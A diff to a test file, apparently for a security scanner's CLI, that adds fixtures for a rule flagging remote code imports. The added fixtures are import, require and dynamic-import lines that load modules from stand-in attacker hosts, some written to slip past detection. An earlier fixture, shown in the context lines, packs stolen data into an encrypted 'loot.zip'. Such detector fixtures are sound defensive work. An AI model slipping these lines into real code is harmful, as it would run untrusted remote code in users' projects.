@@ -27,6 +27,7 @@ import { GIT_HISTORY_RULES } from '../packages/cli/src/rules/git-history.js';
 import {
   DEPENDENCIES_RULES,
   DEPS_INLINE_INSTALL,
+  DEPS_REMOTE_IMPORT,
 } from '../packages/cli/src/rules/dependencies.js';
 import {
   OBFS_EVAL_ATOB,
@@ -179,6 +180,24 @@ describe('malicious fixture attack lines', () => {
         'with pyzipper.AESZipFile("loot.zip", "w", encryption=pyzipper.WZ_AES) as archive:',
         "archiver.registerFormat('zip-encrypted', require('archiver-zip-encrypted'));",
         "const archive = archiver.create('zip-encrypted', {",
+      ],
+    },
+    {
+      rule: DEPS_REMOTE_IMPORT,
+      attackLines: [
+        "import { parsePdf } from 'https://cdn.attacker.com/helpers/pdf-lib.js';",
+        "import { upload } from 'https://exfil.example.com/upload.mjs';",
+        "const charts = await import('https://raw.githubusercontent.com/attacker/helpers/main/charts.js');",
+        'import("http://cdn.attacker.example/export.js").then((mod) => mod.default.init());',
+        'const theme = await import(`https://${process.env.THEME_HOST}/theme.js`);',
+        "const lazy = await import(/* @vite-ignore */ 'https://cdn.attacker.example/lazy.js');",
+        "const quiet = await import(/*'*/ 'https://cdn.attacker.example/quiet.js');",
+        'const pdf = await import(',
+        "import 'https://deno.land/x/attacker_setup/mod.ts';",
+        "export * from 'https://esm.sh/attacker-utils@1.0.0';",
+        'export { render } from "https://cdn.attacker.example/render.mjs";',
+        "const rules = require('https://cdn.attacker.example/lint-rules.js');",
+        "formatter = importlib.import_module('https://cdn.attacker.example/formatter.py')",
       ],
     },
     {
